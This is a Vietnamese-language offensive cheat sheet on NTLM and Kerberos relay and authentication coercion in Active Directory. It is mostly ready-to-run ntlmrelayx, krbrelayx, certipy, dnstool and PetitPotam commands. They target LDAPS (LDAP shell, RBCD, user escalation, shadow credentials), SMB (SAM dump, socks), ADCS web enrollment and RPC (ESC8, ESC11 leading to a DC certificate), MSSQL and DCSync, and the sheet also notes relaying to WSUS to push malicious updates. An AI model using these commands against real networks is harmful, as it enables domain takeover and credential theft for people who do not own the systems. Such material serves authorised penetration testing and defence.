# 14 — NTLM Relay & Coerce (chi tiết các đích relay)

**Trạng thái:** bắt/ép được xác thực NTLM (poisoning hoặc coerce) **và** máy đích
không bắt buộc ký. **Mục tiêu:** chuyển tiếp phiên tới một service để hành động
dưới danh tính nạn nhân. Box "NTLM relay" + "Coerce" của mindmap.

```
Listen and Relay:  (victim) --NTLM--> (bạn / ntlmrelayx) --relay--> (target service)
```

---

## A. Chuẩn bị

```bash
# Tìm máy không ký SMB (relay SMB được)
nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt
# Tắt SMB/HTTP của Responder để ntlmrelayx chiếm cổng (sửa /etc/responder/Responder.conf)
```

Nguồn xác thực: poisoning ([file 01 §E](01-no-credentials.md)) hoặc coerce
(PetitPotam/printerbug/coercer/webdav — [file 01 §G](01-no-credentials.md)).

---

## B. Relay tới LDAP(S)

> **Khi nào:** LDAP signing / LDAPS channel binding **chưa bắt buộc** (mặc định).
> **Tại sao:** tạo computer + cấp RBCD, hoặc escalate user, hoặc mở LDAP shell.

```bash
ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive      # LDAP shell (nc 127.0.0.1 10111)
ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access   # RBCD
ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>            # cấp quyền cho user
ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'   # shadow cred
```

- **Kết quả:** box **"LDAP SHELL" / "RBCD" / "Shadow Credentials"** → Admin/DA.

---

## C. Relay tới SMB

> **Khi nào:** đích không ký SMB; nạn nhân là admin trên đích.

```bash
ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks   # SMB socks (nhiều đích)
# mặc định dump SAM nếu nạn nhân là admin; -c '<cmd>' để chạy lệnh; -i mở shell
```

- **Kết quả:** box **"SMB Socks"** → dùng proxychains với smbexec/secretsdump
  (`-no-pass`).

---

## D. Relay tới HTTP → ADCS (ESC8) / WSUS

> **Khi nào:** CA bật web enrollment (box "Web Enrollment Is Up"); hoặc WSUS.

```bash
ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>
# coerce DC (file 01 §G), nhận cert DC01$ → certipy auth → DCSync
```

- **Kết quả:** box **"ESC8"** → chứng chỉ DC → Domain admin. (WSUS: relay để đẩy
  update độc — box "Relay to WSUS".)

---

## E. Relay tới RPC (ESC11)

```bash
ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>
certipy relay -target rpc://<ip_ca> -ca '<ca_name>'
```

---

## F. Relay tới MSSQL

```bash
ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks      # box "MSSQL Socks"
proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass
```

---

## G. Relay DC → DC (ZeroLogon safe / dcsync)

```bash
ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>   # box "SMB -> NETLOGON"
```

- **Kết quả:** box **"DCSYNC"** trực tiếp.

---

## H. Kerberos relay (krbrelayx)

> **Khi nào:** không có NTLM, nhưng coerce được Kerberos (SMB→SMB, SMB→LDAP).
> Mindmap: "same as NTLM relay, use krbrelayx.py".

```bash
# SMB Kerberos coerce (dnstool thêm record tên đặc biệt rồi petitpotam)
dnstool.py -u "<domain>\<user>" -p '<password>' -d "<attacker_ip>" --action add "<dns_server_ip>" -r "<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" --tcp
petitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>1UWh...' <target>
krbrelayx.py ...     # relay Kerberos tới SMB/LDAP
```

---

## Bảng tổng: đích relay → kết quả

| Đích | Lệnh lõi | Kết quả |
|------|----------|---------|
| LDAP(S) | `-t ldaps://dc --add-computer/--escalate-user/--shadow-credentials` | RBCD / escalate / shadow / LDAP shell |
| SMB | `-tf unsigned.txt -socks` | SAM dump / shell / socks |
| HTTP/ADCS | `-t http://ca/certsrv/certfnsh.asp --adcs` | ESC8 → cert DC → DA |
| RPC/ADCS | `-t rpc://ca -rpc-mode ICPR` | ESC11 → cert |
| MSSQL | `-t mssql://ip -socks` | SQL socks |
| NETLOGON | `-t dcsync://dc -auth-smb ...` | DCSYNC |
| WSUS | relay to WSUS | đẩy update độc |

## Checklist Relay

- [ ] `--gen-relay-list` tìm đích không ký
- [ ] Tắt SMB/HTTP Responder
- [ ] Chọn đích: LDAP (RBCD/escalate), ADCS (ESC8), SMB (socks), MSSQL, dcsync
- [ ] Nguồn: poisoning hoặc coerce (PetitPotam/printerbug/webdav)
- [ ] Không NTLM → krbrelayx (Kerberos relay)
